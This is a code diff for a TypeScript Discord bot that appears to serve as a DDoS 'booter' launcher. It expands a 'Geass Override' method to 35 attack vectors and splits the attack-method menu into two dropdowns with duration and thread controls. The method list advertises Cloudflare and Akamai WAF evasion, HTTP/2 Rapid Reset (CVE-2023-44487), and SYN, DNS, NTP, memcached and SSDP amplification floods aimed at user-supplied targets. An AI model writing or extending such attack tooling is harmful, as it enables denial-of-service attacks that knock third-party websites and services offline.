@@ -62,7 +62,7 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 33v]",    description: "MAX POWER — 33 vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+AppSmart+LHBomb+H2Prio+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 35v]",    description: "MAX POWER — 35 vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+AppSmart+LHBomb+H2Prio+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH+gRPC+H2Pri", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -848,14 +848,20 @@ function startMonitor(attackId: number, editFn: MonitorEditFn, target: string, u
   monitors.set(attackId, tick);
 }
 
-// ── Build launcher embed with all 3 dropdowns ─────────────────────────────────
-function buildLauncherComponents(target: string) {
-  // Row 1 — Method select (max 25 options)
-  const methodMenu = new StringSelectMenuBuilder()
+// ── Build launcher embed with all dropdowns ────────────────────────────────────
+// Discord hard-limit: 25 options per select menu, 5 rows per message.
+// 35 methods split: Row1 = first 25, Row2 = remaining 10, Row3 = duration,
+// Row4 = threads, Row5 = Launch/Cancel buttons.
+const METHOD_OPTIONS_A = METHOD_OPTIONS.slice(0, 25); // Geass + L7 + L4 + L3
+const METHOD_OPTIONS_B = METHOD_OPTIONS.slice(25);    // ARES OMNIVECT ∞
+
+function buildLauncherComponents(_target: string) {
+  // Row 1 — Methods 1-25 (Geass, L7, L4, L3)
+  const methodMenuA = new StringSelectMenuBuilder()
     .setCustomId("select_method")
-    .setPlaceholder("⚔️ Choose attack method...")
+    .setPlaceholder("⚔️ Method — Geass / L7 / L4 / L3 (1-25)...")
     .addOptions(
-      METHOD_OPTIONS.map(m =>
+      METHOD_OPTIONS_A.map(m =>
         new StringSelectMenuOptionBuilder()
           .setValue(m.value)
           .setLabel(m.label)
@@ -863,7 +869,20 @@ function buildLauncherComponents(target: string) {
       )
     );
 
-  // Row 2 — Duration select
+  // Row 2 — Methods 26-35 (ARES OMNIVECT advanced vectors)
+  const methodMenuB = new StringSelectMenuBuilder()
+    .setCustomId("select_method_2")
+    .setPlaceholder("🌀 Method — ARES OMNIVECT ∞ (26-35)...")
+    .addOptions(
+      METHOD_OPTIONS_B.map(m =>
+        new StringSelectMenuOptionBuilder()
+          .setValue(m.value)
+          .setLabel(m.label)
+          .setDescription(m.description.slice(0, 100))
+      )
+    );
+
+  // Row 3 — Duration select
   const durationMenu = new StringSelectMenuBuilder()
     .setCustomId("select_duration")
     .setPlaceholder("⏱ Duration (default: 60s)")
@@ -876,7 +895,7 @@ function buildLauncherComponents(target: string) {
       )
     );
 
-  // Row 3 — Thread select
+  // Row 4 — Thread select
   const threadMenu = new StringSelectMenuBuilder()
     .setCustomId("select_threads")
     .setPlaceholder("🧵 Threads (default: 200)")
@@ -890,7 +909,8 @@ function buildLauncherComponents(target: string) {
     );
 
   return [
-    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenu),
+    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuA),
+    new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(methodMenuB),
     new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(durationMenu),
     new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(threadMenu),
   ];
@@ -1326,8 +1346,8 @@ async function handleSelectMenu(interaction: StringSelectMenuInteraction): Promi
 
   const value = interaction.values[0];
 
-  if (interaction.customId === "select_method") {
-    // Update selected method label in session (store in a parallel map)
+  if (interaction.customId === "select_method" || interaction.customId === "select_method_2") {
+    // Update selected method — both rows feed into the same pendingMethodMap
     pendingMethodMap.set(userId, value);
   } else if (interaction.customId === "select_duration") {
     session.duration = parseInt(value, 10);
